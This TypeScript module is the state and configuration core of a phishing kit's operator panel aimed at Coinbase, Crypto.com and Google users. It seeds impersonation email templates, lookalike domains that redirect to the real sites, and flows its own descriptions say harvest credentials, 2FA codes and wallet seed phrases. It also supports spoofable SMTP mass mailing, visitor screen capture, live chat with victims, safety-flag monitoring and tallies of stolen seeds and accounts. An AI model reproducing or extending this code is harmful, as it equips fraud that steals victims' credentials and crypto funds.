import {
	dbGetVisitors,
	dbUpsertVisitor,
	dbUpdateVisitorStatus,
	dbUpdateVisitorFlow,
	dbIncrementVisitorField,
	dbDeleteVisitor,
	dbDeleteAllVisitors,
	dbSetVisitorBypass,
	dbSetVisitorLastTwo,
	dbSetVisitorLastPage,
	dbGetLogs,
	dbAddLog,
	dbGetFlows,
	dbInsertFlow,
	dbUpdateFlow as dbUpdateFlowRow,
	dbDeleteFlow as dbDeleteFlowRow,
	dbGetHosts,
	dbInsertHost,
	dbUpdateHost as dbUpdateHostRow,
	dbDeactivateHost,
	dbGetDomains,
	dbSeedDefaultTemplates
} from './database.js';
import fs from 'node:fs';
import path from 'node:path';

interface SeedTemplate {
	id: string;
	name: string;
	subject: string;
	variables: string[];
	html: string;
	by: string;
}

const SEED_TEMPLATES: Array<Omit<SeedTemplate, 'html'> & { file: string }> = [
	{ id: 'Coinbase_Portal', name: 'Coinbase Support Request', subject: 'URGENT: Your Coinbase Account Requires Verification', variables: ['{{Representative name}}', '{{Case ID}}', '{{Panel Link}}'], by: 'admin', file: 'coinbase-support-request.html' },
	{ id: 'Coinbase_SafePal', name: 'Coinbase SafePal', subject: 'Wallet Recovery Instructions', variables: ['{{Safepal Seed}}'], by: 'admin', file: 'coinbase-safepal.html' },
	{ id: 'Google_Employee1', name: 'Google Employee #1', subject: 'Your Google Support Representative', variables: ['{{Representative Name}}', '{{Case ID}}'], by: 'admin', file: 'google-employee-1.html' },
	{ id: 'Google_Employee2', name: 'Google Employee #2', subject: 'Representative Assignment Verification', variables: ['{{Representative Name}}', '{{Case ID}}'], by: 'admin', file: 'google-employee-2.html' },
	{ id: 'Google_Password1', name: 'Google Password #1', subject: 'Your Temporary Access Password', variables: ['{{Password}}'], by: 'admin', file: 'google-password-1.html' },
	{ id: 'Google_Password2', name: 'Google Password #2', subject: 'Recent Call Follow-Up', variables: ['{{Password}}'], by: 'admin', file: 'google-password-2.html' },
	{ id: 'Google_Portal1', name: 'Google Portal #1', subject: 'Your Access Portal', variables: ['{{Case ID}}', '{{Panel Link}}'], by: 'admin', file: 'google-portal-1.html' },
	{ id: 'Google_Portal2', name: 'Google Portal #2', subject: 'Case Portal Access', variables: ['{{Representative Name}}', '{{Case ID}}', '{{Panel Link}}'], by: 'admin', file: 'google-portal-2.html' },
	{ id: 'Google_Portal3', name: 'Google Portal #3', subject: 'Case Access Portal', variables: ['{{Panel Link}}'], by: 'admin', file: 'google-portal-3.html' }
];

function loadSeedTemplates(): SeedTemplate[] {
	const dir = path.resolve('data/templates');
	const out: SeedTemplate[] = [];
	for (const t of SEED_TEMPLATES) {
		try {
			const html = fs.readFileSync(path.join(dir, t.file), 'utf-8');
			out.push({ ...t, html });
		} catch {
			// File missing — skip silently. Operators can still create their own templates.
		}
	}
	return out;
}

export interface Visitor {
	ip: string;
	flag: string;
	city: string;
	region: string;
	country: string;
	status: 'online' | 'offline';
	flow: string;
	lastSeen: string;
	connectedAt: number;
	phrases: number;
	accounts: number;
	uploads: number;
	platform: string;
	device: string;
	lastPage: string;
	lastPageRoute: string;
	flowSteps: FlowStep[];
	inputs: Record<string, string>;
	wallets: string[];
	screenSize: string;
	timezone: string;
	browser: string;
	os: string;
	cpuCores: number;
	email: string;
	module: string;
	userId: string;
	userAgent: string;
	flowBypassed: boolean;
	capturedBy: string;
	lastTwoDigits: string;
}

export interface LogEntry {
	id: string;
	message: string;
	time: string;
	timestamp: number;
	type: 'connect' | 'disconnect' | 'action' | 'alert' | 'data';
}

export interface OverviewStats {
	uptime: string;
	uptimeStart: string;
	totalVisitors: number;
	onlineVisitors: number;
	totalClients: number;
	activeClients: number;
	activityRate: string;
	last24h: number;
	lastWeek: number;
	vaultSetups: number;
	completedSetups: number;
	completedPct: number;
	totalAssets: number;
	activeSeeds: number;
}

export interface FlowStep {
	page: string;
	passed: boolean;
}

export interface Flow {
	id: string;
	name: string;
	description: string;
	steps: string[];
	active: boolean;
}

export interface ChatMessage {
	id: string;
	user: string;
	message: string;
	time: string;
	timestamp: number;
}

export interface HostConfig {
	id: string;
	domain: string;
	active: boolean;
	platform: string;
	redirectUrl: string;
	lastUpdated: string;
}

export type ServerEvent =
	| { type: 'init'; payload: InitPayload }
	| { type: 'visitor:connected'; payload: Visitor }
	| { type: 'visitor:disconnected'; payload: { ip: string } }
	| { type: 'visitor:updated'; payload: Visitor }
	| { type: 'visitor:nextpage'; payload: { ip: string } }
	| { type: 'visitor:screen:data'; payload: { ip: string; src: string } }
	| { type: 'stats:updated'; payload: OverviewStats }
	| { type: 'log:new'; payload: LogEntry }
	| { type: 'host:redpage'; payload: { domain: string } }
	| { type: 'flows:updated'; payload: Flow[] }
	| { type: 'users:updated'; payload: UserAccount[] }
	| { type: 'domains:updated'; payload: CustomDomain[] }
	| { type: 'inbox:updated'; payload: InboxAccount[] }
	| { type: 'chat:new'; payload: ChatMessage }
	| { type: 'chat:list'; payload: ChatMessage[] }
	| { type: 'livechat:msg:new'; payload: { conversationId: string; visitorIp: string; message: any } }
	| { type: 'livechat:msg:read'; payload: { conversationId: string; visitorIp: string } }
	| { type: 'livechat:typing'; payload: { conversationId: string; visitorIp: string; sender: 'visitor' | 'operator' } }
	| { type: 'vault:updated'; payload: any }
	| { type: 'admin:link'; payload: { on: boolean; domain: string; auth: string } }
	| { type: 'mailer:result'; payload: { sent: number; failed: number; total: number; errors: string[] } };

export interface UserAccount {
	id: string;
	username: string;
	role: 'admin' | 'user';
	createdAt: string;
	lastLogin: string | null;
	active: boolean;
}

export interface CustomDomain {
	id: string;
	domain: string;
	status: 'active' | 'inactive' | 'pending';
	phishKey: string;
	createdAt: string;
	module: string;
	landingPage: string;
	kind: 'regular' | 'vault';
	idMode: 'case_input' | 'url_param';
	caseId: string;
	underAttack: boolean;
	serving: boolean;
	googleSafety: 'safe' | 'unsafe' | 'unknown';
	metamaskSafety: 'safe' | 'unsafe' | 'unknown';
	cfStatus: 'active' | 'pending' | 'error' | 'unknown';
	cfNsPrimary: string;
	cfNsSecondary: string;
	lastChecked: number;
}

export interface InboxAccount {
	id: string;
	email: string;
	provider: string;
	connected: boolean;
	messageCount: number;
	storageUsed: number;
}

export interface ServerSettings {
	landingEnabled: boolean;
	usePhishKey: boolean;
	disableDevtools: boolean;
	landingPage: string;
	enableFlow: boolean;
}

export interface ClientSettings {
	pageToast: boolean;
}

export type ClientEvent =
	| { type: 'visitor:push'; payload: { ip: string; targetFlow: string } }
	| { type: 'settings:update'; payload: HostConfig }
	| { type: 'settings:server'; payload: ServerSettings }
	| { type: 'settings:client'; payload: ClientSettings }
	| { type: 'flow:create'; payload: Omit<Flow, 'id'> }
	| { type: 'flow:update'; payload: Flow }
	| { type: 'flow:delete'; payload: { id: string } }
	| { type: 'mailer:send'; payload: { templateId: string; recipients: string[]; subject?: string; html?: string; senderEmail?: string; senderName?: string; replyTo?: string; smtpId?: string; fullAccess?: boolean; sendMode?: 'smtp' | 'mail-server' } }
	| { type: 'mailer:smtp:add'; payload: { id?: string; host: string; port: number; user: string; password: string; useSSL?: boolean; spoofable?: boolean } }
	| { type: 'mailer:smtp:remove'; payload: { id: string } }
	| { type: 'users:create'; payload: { username: string; role: string } }
	| { type: 'users:delete'; payload: { id: string } }
	| { type: 'users:list'; payload: Record<string, never> }
	| { type: 'domains:add'; payload: { domain: string } }
	| { type: 'domains:delete'; payload: { id: string } }
	| { type: 'inbox:add'; payload: { email: string; imapHost: string; imapPort: number } }
	| { type: 'inbox:remove'; payload: { id: string } }
	| { type: 'inbox:refresh'; payload: Record<string, never> }
	| { type: 'profile:update'; payload: { password: string } }
	| { type: 'profile:rotate-key'; payload: Record<string, never> }
	| { type: 'stats:request'; payload: Record<string, never> }
	| { type: 'visitor:redirect'; payload: { ip: string; template: string } }
	| { type: 'visitor:setinputs'; payload: { ip: string; inputs: Record<string, string> } }
	| { type: 'visitor:screen'; payload: { ip: string } }
	| { type: 'visitor:delete'; payload: { ip: string } }
	| { type: 'visitors:delete'; payload: Record<string, never> }
	| { type: 'visitor:bypass-flow'; payload: { ip: string; bypassed: boolean } }
	| { type: 'visitor:set-last-two'; payload: { ip: string; digits: string } }
	| { type: 'visitor:promote-vault'; payload: { ip: string } }
	| { type: 'visitor:livechat-open'; payload: { ip: string } }
	| { type: 'visitor:export'; payload: { ip: string } }
	| { type: 'flow:clear'; payload: { ip: string } }
	| { type: 'flow:reorder'; payload: { ip: string; order: FlowStep[] } }
	| { type: 'chat:send'; payload: { text: string } }
	| { type: 'chat:list'; payload: Record<string, never> }
	| { type: 'chat:delete'; payload: Record<string, never> }
	| { type: 'admin:link'; payload: Record<string, never> }
	| { type: 'livechat:operator:send'; payload: { ip: string; body: string } }
	| { type: 'livechat:operator:read'; payload: { ip: string } }
	| { type: 'vault:update'; payload: { id: string; activity?: string; status?: string; balanceUsd?: number; pending?: number; completed?: number; location?: string } }
	| { type: 'vault:delete'; payload: { id: string } };

export interface InitPayload {
	visitors: Visitor[];
	stats: OverviewStats;
	activityLog: LogEntry[];
	flows: Flow[];
	hosts: HostConfig[];
	users: UserAccount[];
	domains: CustomDomain[];
	inboxAccounts: InboxAccount[];
}

let logIdCounter = 0;

function formatTime(date: Date): string {
	return date.toLocaleTimeString('en-US', {
		hour: 'numeric',
		minute: '2-digit',
		second: '2-digit',
		hour12: true
	});
}

function formatUptime(ms: number): string {
	const totalSeconds = Math.floor(ms / 1000);
	const days = Math.floor(totalSeconds / 86400);
	const hours = Math.floor((totalSeconds % 86400) / 3600);
	const minutes = Math.floor((totalSeconds % 3600) / 60);
	if (days > 0) return `${days}d ${hours}h ${minutes}m`;
	if (hours > 0) return `${hours}h ${minutes}m`;
	return `${minutes}m`;
}

function formatDate(date: Date): string {
	return date.toLocaleString('en-US', {
		month: 'short',
		day: 'numeric',
		year: 'numeric',
		hour: 'numeric',
		minute: '2-digit',
		hour12: true
	});
}

const DEFAULT_FLOWS: Omit<Flow, 'id'>[] = [
	{
		name: 'crypto/loading',
		description: 'Displays a fake loading screen while data is harvested in the background',
		steps: ['Initialize loader', 'Display spinner', 'Harvest background data'],
		active: true
	},
	{
		name: 'crypto/case',
		description: 'Fake support case page that harvests credentials and account info',
		steps: ['Show case form', 'Capture credentials', 'Request 2FA', 'Collect seed phrase'],
		active: true
	},
	{
		name: 'crypto/disconnect_default',
		description: 'Default fallback/disconnect page shown when visitor is parked',
		steps: ['Display disconnect message', 'Show reconnect prompt'],
		active: true
	}
];

const DEFAULT_HOSTS: Omit<HostConfig, 'id'>[] = [
	{
		domain: 'issues-crypto.com',
		active: true,
		platform: 'crypto',
		redirectUrl: 'https://crypto.com',
		lastUpdated: formatDate(new Date())
	},
	{
		domain: '891358coinbase.com',
		active: true,
		platform: 'crypto',
		redirectUrl: 'https://coinbase.com',
		lastUpdated: formatDate(new Date())
	}
];

export class ServerState {
	visitors: Map<string, Visitor> = new Map();
	activityLog: LogEntry[] = [];
	flows: Flow[] = [];
	hosts: HostConfig[] = [];
	users: UserAccount[] = [];
	domains: CustomDomain[] = [];
	inboxAccounts: InboxAccount[] = [];
	chatMessages: ChatMessage[] = [];
	adminLinkAuth: string = Math.random().toString(36).substring(2, 8);
	serverSettings: ServerSettings = {
		landingEnabled: true,
		usePhishKey: false,
		disableDevtools: false,
		landingPage: '',
		enableFlow: true
	};
	clientSettings: ClientSettings = { pageToast: true };
	startedAt: Date = new Date();
	private totalVisitorsSeen = 0;

	constructor() {
		this.loadFromDatabase();
	}

	private loadFromDatabase(): void {
		try {
			// Load visitors
			const dbVisitors = dbGetVisitors();
			for (const v of dbVisitors) {
				this.visitors.set(v.ip, v);
			}
			this.totalVisitorsSeen = dbVisitors.length;

			// Load activity log
			this.activityLog = dbGetLogs(100);
			if (this.activityLog.length > 0) {
				logIdCounter = Math.max(...this.activityLog.map((e) => Number(e.id) || 0));
			}

			// Load flows (seed defaults if empty)
			this.flows = dbGetFlows();
			if (this.flows.length === 0) {
				for (const f of DEFAULT_FLOWS) {
					const id = dbInsertFlow(f);
					this.flows.push({ ...f, id: String(id) });
				}
			}

			// Load hosts (seed defaults if empty)
			this.hosts = dbGetHosts();
			if (this.hosts.length === 0) {
				for (const h of DEFAULT_HOSTS) {
					const id = dbInsertHost(h);
					this.hosts.push({ ...h, id: String(id) });
				}
			}

			// Load domains
			this.domains = dbGetDomains();

			// Seed templates if missing (reads HTML files from disk)
			try {
				const templates = loadSeedTemplates();
				if (templates.length > 0) dbSeedDefaultTemplates(templates);
			} catch (err) {
				console.warn('[state] Failed to seed default templates:', err);
			}

			console.log(
				`[state] Loaded ${dbVisitors.length} visitors, ${this.activityLog.length} logs, ${this.flows.length} flows, ${this.hosts.length} hosts, ${this.domains.length} domains from database`
			);
		} catch (err) {
			console.error('[state] Failed to load from database, using defaults:', err);
			this.seedDefaults();
		}
	}

	private seedDefaults(): void {
		this.flows = DEFAULT_FLOWS.map((f, i) => ({ ...f, id: String(i + 1) }));
		this.hosts = DEFAULT_HOSTS.map((h, i) => ({ ...h, id: String(i + 1) }));
	}

	addLogEntry(message: string, type: LogEntry['type']): LogEntry {
		const now = new Date();
		const entry: LogEntry = {
			id: String(++logIdCounter),
			message,
			time: formatTime(now),
			timestamp: now.getTime(),
			type
		};
		this.activityLog.unshift(entry);
		if (this.activityLog.length > 100) this.activityLog.pop();

		try { dbAddLog(entry); } catch { /* non-critical */ }

		return entry;
	}

	addVisitor(visitor: Visitor): void {
		this.visitors.set(visitor.ip, visitor);
		this.totalVisitorsSeen++;

		try { dbUpsertVisitor(visitor); } catch { /* non-critical */ }
	}

	removeVisitor(ip: string): Visitor | undefined {
		const visitor = this.visitors.get(ip);
		if (visitor) {
			visitor.status = 'offline';
			visitor.lastSeen = 'just now';

			try { dbUpdateVisitorStatus(ip, 'offline', 'just now'); } catch { /* non-critical */ }
		}
		return visitor;
	}

	pushVisitor(ip: string, targetFlow: string): Visitor | undefined {
		const visitor = this.visitors.get(ip);
		if (visitor) {
			visitor.flow = targetFlow;

			try { dbUpdateVisitorFlow(ip, targetFlow); } catch { /* non-critical */ }
		}
		return visitor;
	}

	updateVisitorData(
		ip: string,
		field: 'phrases' | 'accounts' | 'uploads',
		increment: number = 1
	): Visitor | undefined {
		const visitor = this.visitors.get(ip);
		if (visitor) {
			visitor[field] += increment;

			try { dbIncrementVisitorField(ip, field); } catch { /* non-critical */ }
		}
		return visitor;
	}

	setVisitorBypass(ip: string, bypassed: boolean): Visitor | undefined {
		const visitor = this.visitors.get(ip);
		if (visitor) {
			visitor.flowBypassed = bypassed;
			try { dbSetVisitorBypass(ip, bypassed); } catch { /* non-critical */ }
		}
		return visitor;
	}

	setVisitorLastTwo(ip: string, digits: string): Visitor | undefined {
		const visitor = this.visitors.get(ip);
		if (visitor) {
			visitor.lastTwoDigits = digits;
			try { dbSetVisitorLastTwo(ip, digits); } catch { /* non-critical */ }
		}
		return visitor;
	}

	setVisitorLastPage(ip: string, route: string): Visitor | undefined {
		const visitor = this.visitors.get(ip);
		if (visitor) {
			visitor.lastPage = route;
			visitor.lastPageRoute = route;
			try { dbSetVisitorLastPage(ip, route); } catch { /* non-critical */ }
		}
		return visitor;
	}

	deleteVisitor(ip: string): boolean {
		const existed = this.visitors.delete(ip);
		try { dbDeleteVisitor(ip); } catch { /* non-critical */ }
		return existed;
	}

	deleteAllVisitors(): void {
		this.visitors.clear();
		try { dbDeleteAllVisitors(); } catch { /* non-critical */ }
	}

	getStats(): OverviewStats {
		const now = Date.now();
		const uptimeMs = now - this.startedAt.getTime();
		const visitorList = [...this.visitors.values()];
		const onlineCount = visitorList.filter((v) => v.status === 'online').length;
		const dayAgo = now - 24 * 60 * 60 * 1000;
		const weekAgo = now - 7 * 24 * 60 * 60 * 1000;
		const last24h = visitorList.filter((v) => v.connectedAt >= dayAgo).length;
		const lastWeek = visitorList.filter((v) => v.connectedAt >= weekAgo).length;

		const vaultVisitors = visitorList.filter((v) => /vault/i.test(v.module));
		const vaultSetups = vaultVisitors.length;
		const completedSetups = vaultVisitors.filter((v) => v.uploads > 0 || v.phrases > 0).length;
		const completedPct = vaultSetups > 0 ? Math.round((completedSetups / vaultSetups) * 100) : 0;
		const totalAssets = visitorList.reduce((sum, v) => sum + v.accounts + v.uploads, 0);
		const activeSeeds = visitorList.filter((v) => v.phrases > 0).length;

		return {
			uptime: formatUptime(uptimeMs),
			uptimeStart: formatDate(this.startedAt),
			totalVisitors: this.totalVisitorsSeen,
			onlineVisitors: onlineCount,
			totalClients: 1,
			activeClients: onlineCount > 0 ? onlineCount : 0,
			activityRate:
				this.totalVisitorsSeen > 0
					? ((onlineCount / Math.max(this.totalVisitorsSeen, 1)) * 100).toFixed(1) + '%'
					: '0.0%',
			last24h,
			lastWeek,
			vaultSetups,
			completedSetups,
			completedPct,
			totalAssets,
			activeSeeds
		};
	}

	getInitPayload(): InitPayload {
		return {
			visitors: [...this.visitors.values()],
			stats: this.getStats(),
			activityLog: this.activityLog.slice(0, 50),
			flows: this.flows,
			hosts: this.hosts,
			users: this.users,
			domains: this.domains,
			inboxAccounts: this.inboxAccounts
		};
	}

	addFlow(flow: Omit<Flow, 'id'>): Flow {
		try {
			const id = dbInsertFlow(flow);
			const newFlow: Flow = { ...flow, id: String(id) };
			this.flows.push(newFlow);
			return newFlow;
		} catch {
			const newFlow: Flow = { ...flow, id: String(Date.now()) };
			this.flows.push(newFlow);
			return newFlow;
		}
	}

	updateFlow(flow: Flow): void {
		const idx = this.flows.findIndex((f) => f.id === flow.id);
		if (idx !== -1) {
			this.flows[idx] = flow;
			try { dbUpdateFlowRow(flow); } catch { /* non-critical */ }
		}
	}

	deleteFlow(id: string): void {
		this.flows = this.flows.filter((f) => f.id !== id);
		try { dbDeleteFlowRow(id); } catch { /* non-critical */ }
	}

	updateHost(host: HostConfig): void {
		const idx = this.hosts.findIndex((h) => h.id === host.id);
		if (idx !== -1) {
			host.lastUpdated = formatDate(new Date());
			this.hosts[idx] = host;
			try { dbUpdateHostRow(host); } catch { /* non-critical */ }
		}
	}

	deleteHost(domain: string): void {
		const host = this.hosts.find((h) => h.domain === domain);
		if (host) {
			host.active = false;
			try { dbDeactivateHost(domain); } catch { /* non-critical */ }
		}
	}

	addUser(username: string, role: 'admin' | 'user'): UserAccount {
		const user: UserAccount = {
			id: String(Date.now()),
			username,
			role,
			createdAt: formatDate(new Date()),
			lastLogin: null,
			active: true
		};
		this.users.push(user);
		return user;
	}

	deleteUser(id: string): void {
		this.users = this.users.filter((u) => u.id !== id);
	}

	addDomain(domain: string): CustomDomain {
		const d: CustomDomain = {
			id: String(Date.now()),
			domain,
			status: 'pending',
			phishKey: Math.random().toString(36).substring(2, 14),
			createdAt: formatDate(new Date()),
			module: 'Coinbase',
			landingPage: '/loading',
			kind: 'regular',
			idMode: 'case_input',
			caseId: '',
			underAttack: false,
			serving: true,
			googleSafety: 'unknown',
			metamaskSafety: 'unknown',
			cfStatus: 'unknown',
			cfNsPrimary: '',
			cfNsSecondary: '',
			lastChecked: 0
		};
		this.domains.push(d);
		return d;
	}

	deleteDomain(id: string): void {
		this.domains = this.domains.filter((d) => d.id !== id);
	}

	addInboxAccount(email: string): InboxAccount {
		const provider = email.includes('gmail') ? 'Gmail' : email.includes('outlook') ? 'Outlook' : 'IMAP';
		const account: InboxAccount = {
			id: String(Date.now()),
			email,
			provider,
			connected: true,
			messageCount: 0,
			storageUsed: 0
		};
		this.inboxAccounts.push(account);
		return account;
	}

	removeInboxAccount(id: string): void {
		this.inboxAccounts = this.inboxAccounts.filter((a) => a.id !== id);
	}
}

export const serverState = new ServerState();
